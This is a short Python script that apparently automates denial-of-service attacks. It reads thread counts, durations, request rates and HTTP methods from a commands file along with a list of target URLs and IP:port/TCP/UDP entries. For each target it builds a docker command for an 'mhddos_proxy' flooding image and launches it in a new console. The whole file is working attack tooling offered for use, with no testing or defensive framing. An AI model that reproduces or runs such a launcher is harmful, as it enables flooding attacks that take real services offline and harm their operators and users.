import subprocess
from subprocess import Popen

file_name = "..\\commands\\MHDDoS_commands.txt"

file = open(file_name, "r")
number_of_parameters = 5
threads = 0
period = 0
rpc = 0
methods = ""

# "python start.py <layer7-tool> https://example.com <socks-type> <threads> <proxylist> <rpc> <duration> <debug>"
# "python start.py <layer4-tool> <ip:port> <threads> <duration>"

targets = []

for i, line in enumerate(file):
    line = line.replace(' ', '').replace('\n', '')
    if i < number_of_parameters:
        if line.startswith("Threads"):
            threads = line.split(':')[1]
        elif line.startswith("Period"):
            period = line.split(':')[1]
        elif line.startswith("Rpc"):
            rpc = line.split(':')[1]
        elif line.startswith("Methods"):
            methods = line.split(':')[1]
    else:
        if line.startswith('http'):
            targets.append([line])
        else:
            current_line = line.split(':')
            targets.append([current_line[0], current_line[1].split(',')])

const_part_1 = "docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "

const_part_2 = " -t " + threads + " -p " + period + " --rpc " + rpc + " --http-methods " + methods + " --debug"

for target in targets:
    ip = target[0]
    command = const_part_1
    if len(target) > 1:
        for i, parameters in enumerate(target[1]):
            current_parameters = parameters.upper().split('/')
            port = current_parameters[0]
            tool = ""
            if len(current_parameters) > 1:
                tool = current_parameters[1].lower()

            if tool == 'tcp' or tool == 'udp':
                command += tool + "://"

            command += ip + ":" + port

            if i < len(target[1]) - 1:
                command += " "
    else:
        command += ip

    command += const_part_2

    print(command)
    Popen(command, creationflags=subprocess.CREATE_NEW_CONSOLE)
